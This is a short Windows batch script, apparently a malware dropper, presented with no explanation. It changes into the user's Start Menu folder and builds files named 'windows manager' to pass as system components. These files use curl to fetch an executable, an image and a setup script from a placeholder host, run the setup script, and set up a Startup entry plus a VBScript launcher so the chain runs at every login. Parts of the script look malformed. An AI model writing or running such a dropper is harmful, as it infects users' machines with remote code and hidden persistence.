cd C:
cd %APPDATA%
cd Microsoft\Windows\Start Menu\Programs
echo ^curl smth ^> "windows manager.exe" ^&^& ^curl smth ^> "img.png" ^&^& ^curl smth ^> "setup.cmd" ^&^& setup.cmd ^&^& ^cd Startup ^&^& windows manager.cmd > "windows manager.cmd"
echo WScript.Sleep 100; Dim x; ^Set x = Wscript.CreateObject("WScript.Shell"); x.run("Startup/windows manager.cmd") > "windows manager.vbs"
cd Startup
echo ^cd .. windows manager.cmd > "windows manager.cmd"
windows manager.cmd
